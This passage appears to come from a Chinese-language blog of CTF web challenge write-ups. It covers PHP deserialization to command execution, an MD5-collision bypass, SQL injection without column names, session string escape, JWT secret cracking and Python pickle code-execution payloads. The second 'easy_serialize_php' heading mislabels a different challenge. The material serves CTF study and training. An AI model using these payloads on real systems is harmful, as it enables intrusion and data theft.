class=\"hljs-meta\">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:url(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class=\"hljs-comment\">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>其中 <code>if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b']))</code>  利用 payload</p>\n<figure class=\"highlight llvm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\">a<span class=\"hljs-operator\">=</span><span class=\"hljs-variable\">%4</span>d<span class=\"hljs-variable\">%c9</span><span class=\"hljs-variable\">%68</span><span class=\"hljs-variable\">%ff</span><span class=\"hljs-variable\">%0</span>e<span class=\"hljs-variable\">%e3</span><span class=\"hljs-variable\">%5</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%d4</span><span class=\"hljs-variable\">%77</span><span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%15</span><span class=\"hljs-variable\">%87</span><span class=\"hljs-variable\">%d3</span><span class=\"hljs-variable\">%6</span>f<span class=\"hljs-variable\">%a7</span><span class=\"hljs-variable\">%b2</span><span class=\"hljs-variable\">%1</span>b<span class=\"hljs-variable\">%dc</span><span class=\"hljs-variable\">%56</span><span class=\"hljs-variable\">%b7</span><span class=\"hljs-variable\">%4</span>a<span class=\"hljs-variable\">%3</span>d<span class=\"hljs-variable\">%c0</span><span class=\"hljs-variable\">%78</span><span class=\"hljs-variable\">%3</span>e<span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%18</span><span class=\"hljs-variable\">%af</span><span class=\"hljs-variable\">%bf</span><span class=\"hljs-variable\">%a2</span><span class=\"hljs-variable\">%00</span><span class=\"hljs-variable\">%a8</span><span class=\"hljs-variable\">%28</span><span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%f3</span><span class=\"hljs-variable\">%6</span>e<span class=\"hljs-variable\">%8</span>e<span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%b3</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%42</span><span class=\"hljs-variable\">%75</span><span class=\"hljs-variable\">%93</span><span class=\"hljs-variable\">%d8</span><span class=\"hljs-variable\">%49</span><span class=\"hljs-variable\">%67</span><span class=\"hljs-variable\">%6</span>d<span class=\"hljs-variable\">%a0</span><span class=\"hljs-variable\">%d1</span><span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%5</span>d<span class=\"hljs-variable\">%83</span><span class=\"hljs-variable\">%60</span><span class=\"hljs-variable\">%fb</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%07</span><span class=\"hljs-variable\">%fe</span><span class=\"hljs-variable\">%a2</span>&amp;b<span class=\"hljs-operator\">=</span><span class=\"hljs-variable\">%4</span>d<span class=\"hljs-variable\">%c9</span><span class=\"hljs-variable\">%68</span><span class=\"hljs-variable\">%ff</span><span class=\"hljs-variable\">%0</span>e<span class=\"hljs-variable\">%e3</span><span class=\"hljs-variable\">%5</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-variable\">%20</span><span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%d4</span><span class=\"hljs-variable\">%77</span><span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%72</span><span class=\"hljs-variable\">%15</span><span class=\"hljs-variable\">%87</span><span class=\"hljs-variable\">%d3</span><span class=\"hljs-variable\">%6</span>f<span class=\"hljs-variable\">%a7</span><span class=\"hljs-variable\">%b2</span><span class=\"hljs-variable\">%1</span>b<span class=\"hljs-variable\">%dc</span><span class=\"hljs-variable\">%56</span><span class=\"hljs-variable\">%b7</span><span class=\"hljs-variable\">%4</span>a<span class=\"hljs-variable\">%3</span>d<span class=\"hljs-variable\">%c0</span><span class=\"hljs-variable\">%78</span><span class=\"hljs-variable\">%3</span>e<span class=\"hljs-variable\">%7</span>b<span class=\"hljs-variable\">%95</span><span class=\"hljs-variable\">%18</span><span class=\"hljs-variable\">%af</span><span class=\"hljs-variable\">%bf</span><span class=\"hljs-variable\">%a2</span><span class=\"hljs-variable\">%02</span><span class=\"hljs-variable\">%a8</span><span class=\"hljs-variable\">%28</span><span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%f3</span><span class=\"hljs-variable\">%6</span>e<span class=\"hljs-variable\">%8</span>e<span class=\"hljs-variable\">%4</span>b<span class=\"hljs-variable\">%55</span><span class=\"hljs-variable\">%b3</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%42</span><span class=\"hljs-variable\">%75</span><span class=\"hljs-variable\">%93</span><span class=\"hljs-variable\">%d8</span><span class=\"hljs-variable\">%49</span><span class=\"hljs-variable\">%67</span><span class=\"hljs-variable\">%6</span>d<span class=\"hljs-variable\">%a0</span><span class=\"hljs-variable\">%d1</span><span class=\"hljs-variable\">%d5</span><span class=\"hljs-variable\">%5</span>d<span class=\"hljs-variable\">%83</span><span class=\"hljs-variable\">%60</span><span class=\"hljs-variable\">%fb</span><span class=\"hljs-variable\">%5</span>f<span class=\"hljs-variable\">%07</span><span class=\"hljs-variable\">%fe</span><span class=\"hljs-variable\">%a2</span><br></code></pre></td></tr></table></figure>\n<p>来绕过</p>\n</li>\n<li>\n<p>$cmd 过滤了一些字符，直接 <code>ca\\t+/flag</code>  绕过拿到 flag</p>\n</li>\n</ol>\n<h2 id=\"网鼎杯-2020-朱雀组phpweb\"><a class=\"markdownIt-Anchor\" href=\"#网鼎杯-2020-朱雀组phpweb\">#</a> [网鼎杯 2020 朱雀组] phpweb</h2>\n<ol>\n<li>\n<p>查看源代码发现有隐藏表单，发送 data 和时间，可能存在命令执行</p>\n</li>\n<li>\n<p>eval、system 等函数会被检测，于是先 file_get_contents 读一下 index.php:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span><br>    <span class=\"hljs-variable\">$disable_fun</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&quot;exec&quot;</span>,<span class=\"hljs-string\">&quot;shell_exec&quot;</span>,<span class=\"hljs-string\">&quot;system&quot;</span>,<span class=\"hljs-string\">&quot;passthru&quot;</span>,<span class=\"hljs-string\">&quot;proc_open&quot;</span>,<span class=\"hljs-string\">&quot;show_source&quot;</span>,<span class=\"hljs-string\">&quot;phpinfo&quot;</span>,<span class=\"hljs-string\">&quot;popen&quot;</span>,<span class=\"hljs-string\">&quot;dl&quot;</span>,<span class=\"hljs-string\">&quot;eval&quot;</span>,<span class=\"hljs-string\">&quot;proc_terminate&quot;</span>,<span class=\"hljs-string\">&quot;touch&quot;</span>,<span class=\"hljs-string\">&quot;escapeshellcmd&quot;</span>,<span class=\"hljs-string\">&quot;escapeshellarg&quot;</span>,<span class=\"hljs-string\">&quot;assert&quot;</span>,<span class=\"hljs-string\">&quot;substr_replace&quot;</span>,<span class=\"hljs-string\">&quot;call_user_func_array&quot;</span>,<span class=\"hljs-string\">&quot;call_user_func&quot;</span>,<span class=\"hljs-string\">&quot;array_filter&quot;</span>, <span class=\"hljs-string\">&quot;array_walk&quot;</span>,  <span class=\"hljs-string\">&quot;array_map&quot;</span>,<span class=\"hljs-string\">&quot;registregister_shutdown_function&quot;</span>,<span class=\"hljs-string\">&quot;register_tick_function&quot;</span>,<span class=\"hljs-string\">&quot;filter_var&quot;</span>, <span class=\"hljs-string\">&quot;filter_var_array&quot;</span>, <span class=\"hljs-string\">&quot;uasort&quot;</span>, <span class=\"hljs-string\">&quot;uksort&quot;</span>, <span class=\"hljs-string\">&quot;array_reduce&quot;</span>,<span class=\"hljs-string\">&quot;array_walk&quot;</span>, <span class=\"hljs-string\">&quot;array_walk_recursive&quot;</span>,<span class=\"hljs-string\">&quot;pcntl_exec&quot;</span>,<span class=\"hljs-string\">&quot;fopen&quot;</span>,<span class=\"hljs-string\">&quot;fwrite&quot;</span>,<span class=\"hljs-string\">&quot;file_put_contents&quot;</span>);<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gettime</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$func</span>, <span class=\"hljs-variable\">$p</span></span>) </span>&#123;<br>        <span class=\"hljs-variable\">$result</span> = call_user_func(<span class=\"hljs-variable\">$func</span>, <span class=\"hljs-variable\">$p</span>);<br>        <span class=\"hljs-variable\">$a</span>= gettype(<span class=\"hljs-variable\">$result</span>);<br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$a</span> == <span class=\"hljs-string\">&quot;string&quot;</span>) &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$result</span>;<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Test</span> </span>&#123;<br>        <span class=\"hljs-keyword\">var</span> <span class=\"hljs-variable\">$p</span> = <span class=\"hljs-string\">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class=\"hljs-keyword\">var</span> <span class=\"hljs-variable\">$func</span> = <span class=\"hljs-string\">&quot;date&quot;</span>;<br>        <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>            <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">$this</span>-&gt;func != <span class=\"hljs-string\">&quot;&quot;</span>) &#123;<br>                <span class=\"hljs-keyword\">echo</span> gettime(<span class=\"hljs-keyword\">$this</span>-&gt;func, <span class=\"hljs-keyword\">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-variable\">$func</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&quot;func&quot;</span>];<br>    <span class=\"hljs-variable\">$p</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&quot;p&quot;</span>];<br><br>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$func</span> != <span class=\"hljs-literal\">null</span>) &#123;<br>        <span class=\"hljs-variable\">$func</span> = strtolower(<span class=\"hljs-variable\">$func</span>);<br>        <span class=\"hljs-keyword\">if</span> (!in_array(<span class=\"hljs-variable\">$func</span>,<span class=\"hljs-variable\">$disable_fun</span>)) &#123;<br>            <span class=\"hljs-keyword\">echo</span> gettime(<span class=\"hljs-variable\">$func</span>, <span class=\"hljs-variable\">$p</span>);<br>        &#125;<span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>可以看到禁用了一些危险函数，但是里面有一个 Test 类，可以执行命令，而且 unserialize 没有被禁用，就可以构造反序列化来实现命令执行。</p>\n</li>\n<li>\n<p>payload： <code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code>  拿到 flag</p>\n</li>\n</ol>\n<h2 id=\"bjdctf2020cookie-is-so-stable\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf2020cookie-is-so-stable\">#</a> [BJDCTF2020]Cookie is so stable</h2>\n<ol>\n<li>提示 cookie，发现在 flag 输入 id 后 cookie 有一个 user 字段存在模板注入，测试4显示 Hello 4</li>\n<li>发现存在过滤，过滤了: <code>()、''、$</code></li>\n<li>直接用 Twig 的 payload 直接 cat flag</li>\n</ol>\n<h2 id=\"swpu2019web1\"><a class=\"markdownIt-Anchor\" href=\"#swpu2019web1\">#</a> [SWPU2019]Web1</h2>\n<ol>\n<li>\n<p>在广告名处有过滤，可能存在注入点</p>\n</li>\n<li>\n<p>测试 <code>'</code>  然后点广告详情会包错，存在注入点</p>\n</li>\n<li>\n<p>测试字段数，丧心病狂的有 22 个字段数。。。。</p>\n</li>\n<li>\n<p>空格用 <code>/**/</code>  绕过，(select/**/version ()) 看到是 MariaDB</p>\n</li>\n<li>\n<p><a href=\"https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/\">https://blog.zeddyu.info/2019/03/06/Sqli 备忘录 /</a></p>\n</li>\n<li>\n<p><code>select distinct(table_name) from mysql.innodb_index_stats</code>  拿到表名</p>\n</li>\n<li>\n<p>过滤了 or    无列名注入</p>\n</li>\n<li>\n<p><code>select group_concat(b) from (select 1,2,3 as b union select * from users)a</code>  拿 flag</p>\n</li>\n</ol>\n<h2 id=\"安洵杯-2019easy_serialize_php\"><a class=\"markdownIt-Anchor\" href=\"#安洵杯-2019easy_serialize_php\">#</a> [安洵杯 2019] easy_serialize_php</h2>\n<ol>\n<li>\n<p>给出源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-variable\">$function</span> = @<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;f&#x27;</span>];<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">filter</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$img</span></span>)</span>&#123;<br>    <span class=\"hljs-variable\">$filter_arr</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;php&#x27;</span>,<span class=\"hljs-string\">&#x27;flag&#x27;</span>,<span class=\"hljs-string\">&#x27;php5&#x27;</span>,<span class=\"hljs-string\">&#x27;php4&#x27;</span>,<span class=\"hljs-string\">&#x27;fl1g&#x27;</span>);<br>    <span class=\"hljs-variable\">$filter</span> = <span class=\"hljs-string\">&#x27;/&#x27;</span>.implode(<span class=\"hljs-string\">&#x27;|&#x27;</span>,<span class=\"hljs-variable\">$filter_arr</span>).<span class=\"hljs-string\">&#x27;/i&#x27;</span>;<br>    <span class=\"hljs-keyword\">return</span> preg_replace(<span class=\"hljs-variable\">$filter</span>,<span class=\"hljs-string\">&#x27;&#x27;</span>,<span class=\"hljs-variable\">$img</span>);<br>&#125;<br><br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$_SESSION</span>)&#123;<br>    <span class=\"hljs-keyword\">unset</span>(<span class=\"hljs-variable\">$_SESSION</span>);<br>&#125;<br><br><span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&quot;user&quot;</span>] = <span class=\"hljs-string\">&#x27;guest&#x27;</span>;<br><span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;function&#x27;</span>] = <span class=\"hljs-variable\">$function</span>;<br><br>extract(<span class=\"hljs-variable\">$_POST</span>);<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$function</span>)&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img_path&#x27;</span>])&#123;<br>    <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>] = base64_encode(<span class=\"hljs-string\">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>    <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class=\"hljs-variable\">$serialize_info</span> = filter(serialize(<span class=\"hljs-variable\">$_SESSION</span>));<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$function</span> == <span class=\"hljs-string\">&#x27;highlight_file&#x27;</span>)&#123;<br>    highlight_file(<span class=\"hljs-string\">&#x27;index.php&#x27;</span>);<br>&#125;<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$function</span> == <span class=\"hljs-string\">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&#x27;phpinfo();&#x27;</span>); <span class=\"hljs-comment\">//maybe you can find something in here!</span><br>&#125;<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$function</span> == <span class=\"hljs-string\">&#x27;show_image&#x27;</span>)&#123;<br>    <span class=\"hljs-variable\">$userinfo</span> = unserialize(<span class=\"hljs-variable\">$serialize_info</span>);<br>    <span class=\"hljs-keyword\">echo</span> file_get_contents(base64_decode(<span class=\"hljs-variable\">$userinfo</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>]));<br>&#125; <br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>给出了 phpinfo 并且提示里面有内容，看到 <code>d0g3_f1ag.php</code></p>\n</li>\n<li>\n<p>看到反序列化 session，盲猜应该是 session.upload_progress 的题目，然后 filter 函数应该是是利用字符逃逸</p>\n</li>\n<li>\n<p>有一个 <code>extract($_POST);</code> ，当我们 POST 一个_SESSION 变量之后，就会覆盖 SESSION，这里就是可控点</p>\n</li>\n<li>\n<p>接下来就是如何字符逃逸。我们需要构造出来的 session 是</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">_SESSION</span>[user]=<br><span class=\"hljs-attribute\">flagphpphpflagphp</span>&amp;_SESSION[exp]=;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;img&quot;</span>;s:<span class=\"hljs-number\">20</span>:<span class=\"hljs-string\">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">&quot;exp&quot;</span>;s:<span class=\"hljs-number\">2</span>:<span class=\"hljs-string\">&quot;a&quot;</span>&amp;_SESSION[function]=flagflagflagflagflagflagflagflagphpphp<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>拿到 d0g3_f1ag.php 源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$flag</span> = <span class=\"hljs-string\">&#x27;flag in /d0g3_fllllllag&#x27;</span>;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>发现文件名经过 base64 编码后长度不变，改一下就好，拿到 flag</p>\n</li>\n</ol>\n<h2 id=\"安洵杯-2019easy_serialize_php-2\"><a class=\"markdownIt-Anchor\" href=\"#安洵杯-2019easy_serialize_php-2\">#</a> [安洵杯 2019] easy_serialize_php</h2>\n<ol>\n<li>\n<p>提示找到 &quot;lv6&quot;，用脚本跑，在第 181 页</p>\n</li>\n<li>\n<p>买不起，改折扣，提示 <code>b1g_m4mber</code></p>\n</li>\n<li>\n<p>提示只能 admin 访问，有 JWT</p>\n</li>\n<li>\n<p><a href=\"https://github.com/brendan-rius/c-jwt-cracker\">https://github.com/brendan-rius/c-jwt-cracker</a>  用这个工具跑   密钥是 <code>1Kun</code></p>\n</li>\n<li>\n<p>用 https://jwt.io/#encoded-jwt 修改，拿到修改后的 JWT，访问拿到提示 <code>/static/asd1f654e683wq/www.zip</code></p>\n</li>\n<li>\n<p>源码中 Admin.py 有一个 pickle 触发点</p>\n</li>\n<li>\n<p>payload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> marshal<br><span class=\"hljs-keyword\">import</span> base64<br><span class=\"hljs-keyword\">import</span> urllib<br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">foo</span>():</span><br>    <span class=\"hljs-keyword\">import</span> commands<br>    output = commands.getstatusoutput(<span class=\"hljs-string\">&#x27;cat /flag.txt&#x27;</span>)<br>    <span class=\"hljs-keyword\">return</span> output<br><br>payload = <span class=\"hljs-string\">&quot;&quot;&quot;ctypes</span><br><span class=\"hljs-string\">FunctionType</span><br><span class=\"hljs-string\">(cmarshal</span><br><span class=\"hljs-string\">loads</span><br><span class=\"hljs-string\">(cbase64</span><br><span class=\"hljs-string\">b64decode</span><br><span class=\"hljs-string\">(S&#x27;%s&#x27;</span><br><span class=\"hljs-string\">tRtRc__builtin__</span><br><span class=\"hljs-string\">globals</span><br><span class=\"hljs-string\">(tRS&#x27;&#x27;</span><br><span class=\"hljs-string\">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(foo.func_code))<br><br><br>payload = urllib.quote(payload)<br><span class=\"hljs-built_in\">print</span> payload<br></code></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">网上版本<br><br><span class=\"hljs-keyword\">import</span> pickle<br><span class=\"hljs-keyword\">import</span> urllib<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">A</span>(<span class=\"hljs-params\"><span class=\"hljs-built_in\">object</span></span>):</span><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">__reduce__</span>(<span class=\"hljs-params\">self</span>):</span><br>        a = <span class=\"hljs-string\">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span><br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-built_in\">eval</span>,(a,))<br>a = A()<br>test = pickle.dumps(a)<br>payload = urllib.quote(test)<br><span class=\"hljs-built_in\">print</span> payload<br></code></pre></td></tr></table></figure>\n</li>\n</ol>\n",
            "tags": []
        }
    ]
}